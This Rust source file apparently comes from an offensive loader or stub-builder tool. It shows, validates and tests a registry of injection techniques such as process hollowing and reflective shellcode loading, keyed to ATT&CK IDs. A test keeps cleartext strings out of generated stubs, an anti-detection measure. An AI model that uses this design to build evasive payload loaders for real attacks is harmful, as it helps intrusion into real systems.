    out.push_str(&ui.field("yaml key", def.name));
    out.push('\n');
    out.push_str(&ui.field_wrapped("requires", capabilities(def.requires), width));
    out.push('\n');
    if !def.conflicts.is_empty() {
        out.push_str(&ui.field_wrapped("conflicts", def.conflicts.join(", "), width));
        out.push('\n');
    }
    if !def.syscalls.is_empty() {
        out.push_str(&ui.field_wrapped("syscalls", def.syscalls.join(", "), width));
        out.push('\n');
    }
    if def.resolves_imports {
        out.push_str(&ui.field("imports", "shared resolver"));
        out.push('\n');
    }

    out.push('\n');
    out.push_str(&ui.rule(width));
    out.push_str("\n\n");

    // The styled header replaces the README's title; the README is prose-only,
    // so the registry's parameter table and example are always prepended.
    let body = format!(
        "{}{}",
        params_markdown(&[], def.params_example),
        strip_header(def.readme)
    );
    out.push_str(&markdown::render(&body, ui, width));

    out.push('\n');
    out.push_str(&ui.dim(format!("{} {}", glyph::DOT, def.doc_path)));
    out.push('\n');
    Ok(out)
}

/// The Markdown preamble `techniques show`/`features show` prepends: a parameter
/// table (when the registry declares one) followed by the copy-paste example.
///
/// Shared by both registries, so a technique and a loader feature render their
/// parameters the same way.
pub(crate) fn params_markdown(params: &[ParamDef], example: &str) -> String {
    let mut out = String::new();
    if !params.is_empty() {
        out.push_str("## Parameters\n\n");
        out.push_str("| Parameter | Type | Required | Default | Description |\n");
        out.push_str("| --- | --- | --- | --- | --- |\n");
        for param in params {
            let required = if param.required { "yes" } else { "no" };
            let default = match param.default {
                Some(value) => format!("`{value}`"),
                None => "—".to_string(),
            };
            out.push_str(&format!(
                "| `{}` | {} | {} | {} | {} |\n",
                param.key,
                param.kind.label(),
                required,
                default,
                param.description,
            ));
        }
        out.push('\n');
    }
    if !example.trim().is_empty() {
        out.push_str("## Example\n\n```yaml\n");
        out.push_str(example.trim());
        out.push_str("\n```\n\n");
    }
    out
}

/// The README's `# ` title, when it has one.
pub(crate) fn readme_title(readme: &str) -> Option<&str> {
    readme
        .lines()
        .next()
        .and_then(|line| line.strip_prefix("# "))
}

/// The color role of a maturity (shared with [`stability_label`]).
pub(crate) fn stability_tone(stability: Stability) -> Tone {
    match stability {
        Stability::Stable => Tone::Ok,
        Stability::Experimental => Tone::Warn,
        Stability::Unimplemented | Stability::Deprecated => Tone::Bad,
    }
}

/// Comma-joined capability labels for the `requires` field.
pub(crate) fn capabilities(requires: &[Capability]) -> String {
    requires
        .iter()
        .map(|capability| capability.label())
        .collect::<Vec<_>>()
        .join(", ")
}

/// Drops the README's leading `# ` title and its `## Metadata` section, which
/// the styled header supersedes.
pub(crate) fn strip_header(readme: &str) -> String {
    let mut out = String::new();
    let mut in_metadata = false;
    for line in readme.lines() {
        if in_metadata {
            if line.starts_with("## ") {
                in_metadata = false;
            } else {
                continue;
            }
        }
        if out.is_empty() && line.starts_with("# ") {
            continue;
        }
        if line.trim() == "## Metadata" {
            in_metadata = true;
            continue;
        }
        out.push_str(line);
        out.push('\n');
    }
    out
}

/// Validates the registry. Returns a list of problems; empty means all good.
///
/// This is a CI helper: it reports failures as warnings without failing.
pub fn validate() -> Vec<String> {
    let mut problems = Vec::new();
    for def in all() {
        // Registered in `all()` ⇒ its `mod.rs` exists and defines a `DEF`.
        if def.name.trim().is_empty() {
            problems.push("technique with an empty name".to_string());
        }

        if def.attck.is_empty() {
            problems.push(format!("{}: 'attck' must not be empty", def.name));
        }

        if def.requires.is_empty() {
            problems.push(format!("{}: 'requires' must not be empty", def.name));
        }

        if def.conflicts.contains(&def.name) {
            problems.push(format!("{}: conflicts with itself", def.name));
        }

        // `doc_path` must point to an existing file.
        let readme_path = Path::new(env!("CARGO_MANIFEST_DIR")).join(def.doc_path);
        if !readme_path.is_file() {
            problems.push(format!(
                "{}: doc_path does not exist: {}",
                def.name, def.doc_path
            ));
        }

        // `params_example` must parse as a runtime step.
        if serde_yml::from_str::<RuntimeStep>(def.params_example).is_err() {
            problems.push(format!("{}: params_example does not parse", def.name));
        }

        if def.stub_fragment.trim().is_empty() {
            problems.push(format!("{}: stub_fragment.rs is empty", def.name));
        }

        let mut title_seen = false;
        if let Some(first) = def.readme.lines().next() {
            title_seen = first.starts_with("# ");
        }
        if !title_seen {
            problems.push(format!("{}: README.md has no '#' title", def.name));
        }
        for section in REQUIRED_SECTIONS {
            if !def.readme.contains(section) {
                problems.push(format!(
                    "{}: README.md missing section '{section}'",
                    def.name
                ));
            }
        }
        for section in FORBIDDEN_SECTIONS {
            if def.readme.contains(section) {
                problems.push(format!(
                    "{}: README.md must not contain '{section}' — that data is rendered from the \
                     registry (TechniqueDef); keep the README prose-only",
                    def.name
                ));
            }
        }
        if !def.readme.contains("```mermaid") {
            problems.push(format!(
                "{}: README.md has no ```mermaid diagram (the 'How it works' section should open \
                 with one)",
                def.name
            ));
        }

        let tests_path = tests_path(def);
        match std::fs::read_to_string(&tests_path) {
            Ok(content) if content.contains("#[test]") => {}
            Ok(_) => problems.push(format!("{}: tests.rs has no #[test]", def.name)),
            Err(_) => problems.push(format!(
                "{}: tests.rs not found at '{}'",
                def.name,
                tests_path.display()
            )),
        }
    }
    // Loader features and SSN resolvers live in parallel registries; validate
    // them too.
    problems.extend(crate::features::validate());
    problems.extend(crate::engine::syscalls::resolvers::validate());
    problems
}

/// The `tests.rs` path of a technique (used by `validate`).
fn tests_path(def: &TechniqueDef) -> std::path::PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("src")
        .join("techniques")
        .join(def.name)
        .join("tests.rs")
}

/// The technique's one-line summary, taken from its README.
///
/// Shared by `techniques list` and the interactive `build` wizard so both show
/// the same wording.
pub fn summary(def: &TechniqueDef) -> &str {
    short_description(def.readme)
}

/// Extracts the one-line summary of a technique README (the first non-empty
/// line under `## What it does`).
pub(crate) fn short_description(readme: &str) -> &str {
    let marker = "## What it does";
    let start = readme.find(marker).map(|i| i + marker.len()).unwrap_or(0);
    for line in readme[start..].lines() {
        let trimmed = line.trim();
        if !trimmed.is_empty() && !trimmed.starts_with('#') {
            return trimmed;
        }
    }
    ""
}

/// Shortens a summary to at most `max` characters, appending an ellipsis.
pub(crate) fn truncate(text: &str, max: usize) -> String {
    if text.chars().count() <= max {
        return text.to_string();
    }
    let mut out: String = text.chars().take(max.saturating_sub(1)).collect();
    out.push('…');
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn registry_is_non_empty_and_well_formed() {
        assert!(
            !all().is_empty(),
            "at least one technique must be registered"
        );
        for def in all() {
            assert!(!def.name.is_empty(), "technique name must not be empty");
            assert!(!def.doc_path.is_empty(), "doc_path must not be empty");

            // The README referenced by doc_path must exist on disk.
            let readme_path = Path::new(env!("CARGO_MANIFEST_DIR")).join(def.doc_path);
            assert!(
                readme_path.is_file(),
                "doc_path does not exist: {}",
                readme_path.display()
            );
        }
    }

    /// Every registered technique must have a docs page. The site sidebar and the
    /// `docs/techniques/index.md` overview table are generated from this registry
    /// at assemble time (see `docs/site/scripts/assemble-docs.mjs`), so they
    /// cannot drift and need no per-technique nav or overview entry.
    #[test]
    fn every_technique_is_documented() {
        let root = Path::new(env!("CARGO_MANIFEST_DIR"));
        for def in all() {
            let docs_page = format!("docs/techniques/ref/{}.md", def.name);
            assert!(
                root.join(&docs_page).is_file(),
                "{}: missing docs page '{docs_page}'",
                def.name
            );
        }
    }

    #[test]
    fn every_technique_has_a_parseable_yaml_example() {
        for def in all() {
            let step: RuntimeStep = serde_yml::from_str(def.params_example)
                .unwrap_or_else(|e| panic!("{} params_example does not parse: {e}", def.name));
            let round_tripped = serde_yml::to_string(&step).expect("serialize RuntimeStep");
            assert!(
                !round_tripped.trim().is_empty(),
                "{} params_example must serialize",
                def.name
            );
        }
    }

    #[test]
    fn find_returns_registered_technique() {
        assert!(find("process_hollowing").is_some());
        assert!(find("does_not_exist").is_none());
    }

    #[test]
    fn list_includes_process_hollowing() {
        let output = list(&Palette::plain());
        assert!(
            output.contains("process_hollowing"),
            "list output: {output}"
        );
        assert!(output.contains("execution"), "list output: {output}");
        assert!(output.contains("preparation"), "list output: {output}");
    }

    /// Rows are ordered by category, then stability, then technique name.
    #[test]
    fn list_is_ordered_by_category_stability_then_name() {
        let output = list(&Palette::plain());
        let names: Vec<&str> = output
            .lines()
            .filter_map(|line| line.split_whitespace().next())
            .filter(|token| find(token).is_some())
            .collect();

        let mut expected: Vec<&TechniqueDef> = all().iter().collect();
        expected.sort_by_key(|def| (def.category, def.stability, def.name));
        let expected: Vec<&str> = expected.iter().map(|def| def.name).collect();

        assert_eq!(names, expected, "list output: {output}");
    }

    /// The plain palette must not leak escape codes into the listing.
    #[test]
    fn plain_list_has_no_escape_codes() {
        let output = list(&Palette::plain());
        assert!(!output.contains('\u{1b}'), "escapes leaked: {output:?}");
    }

    /// A long technique name or ATT&CK list must not push the rest of its row.
    ///
    /// Regression: the name column was a fixed 18 characters, so the 19-char
    /// `living_off_the_land` and `execution_callbacks` shifted the columns that
    /// follow them by one.
    #[test]
    fn list_columns_align_across_rows() {
        let output = list(&Palette::plain());
        let starts: Vec<usize> = all()
            .iter()
            .map(|def| {
                let line = output
                    .lines()
                    .find(|line| line.split_whitespace().next() == Some(def.name))
                    .unwrap_or_else(|| panic!("no row for {}: {output}", def.name));
                let last = truncate(summary(def), 70);
                line.rfind(&last)
                    .unwrap_or_else(|| panic!("no summary column in {line:?}"))
            })
            .collect();

        assert!(
            starts.windows(2).all(|pair| pair[0] == pair[1]),
            "the summary column is ragged: {starts:?}\n{output}"
        );
    }

    /// Long summaries are truncated so the listing stays readable.
    #[test]
    fn truncates_long_summaries() {
        assert_eq!(truncate("short", 10), "short");
        let cut = truncate("0123456789abcdef", 8);
        assert_eq!(cut.chars().count(), 8);
        assert!(cut.ends_with("…"), "no ellipsis: {cut:?}");
    }

    #[test]
    fn show_renders_metadata_and_readme() {
        let page = show("process_hollowing", &Palette::plain()).expect("known technique");
        assert!(page.contains("Process hollowing"), "page: {page}");
        assert!(page.contains("T1055"), "page: {page}");
        // The README body is rendered, not dumped raw.
        assert!(page.contains("What it does"), "page: {page}");
        assert!(!page.contains("## Metadata"), "page: {page}");
        assert!(!page.contains('\u{1b}'), "escapes leaked: {page:?}");
    }

    #[test]
    fn readme_is_verbatim() {
        let raw = readme("process_hollowing").expect("known technique");
        assert!(raw.contains("# Process hollowing"));
        assert!(raw.contains("## What it does"));
    }

    #[test]
    fn unknown_technique_is_an_error() {
        assert!(show("does_not_exist", &Palette::plain()).is_err());
        assert!(readme("does_not_exist").is_err());
    }

    /// Smoke test: the renderer survives every real README and keeps its
    /// required section.
    #[test]
    fn show_pages_every_technique() {
        for def in all() {
            let page = show(def.name, &Palette::plain())
                .unwrap_or_else(|error| panic!("{}: {error}", def.name));
            assert!(!page.is_empty(), "{}: empty page", def.name);
            assert!(
                page.contains("What it does"),
                "{}: missing section: {page}",
                def.name
            );
        }
    }

    /// A technique fragment must not declare a `thiserror` diagnostic: its
    /// `#[error("...")]` literals reach the generated stub in cleartext.
    ///
    /// Every diagnostic must be rebuilt at runtime through `StringsConfig` (the
    /// `MESSAGES` pattern in `process_hollowing`/`fibers`/...). This is the
    /// source-level counterpart of the compiled-stub guardrail
    /// (`no_sensitive_literals_in_generated_stubs`), and it runs without rustc.
    #[test]
    fn no_fragment_declares_a_cleartext_diagnostic() {
        let fragments =
            all()
                .iter()
                .map(|def| (def.name, def.stub_fragment))
                .chain(std::iter::once((
                    "reflective_loading (shellcode)",
                    reflective_loading::SHELLCODE_FRAGMENT,
                )));
        for (name, fragment) in fragments {
            assert!(
                !fragment.contains("thiserror::Error"),
                "technique '{name}' derives a thiserror diagnostic"
            );
            assert!(
                !fragment.contains("#[error("),
                "technique '{name}' declares a cleartext `#[error(...)]` diagnostic"
            );
        }
    }
}
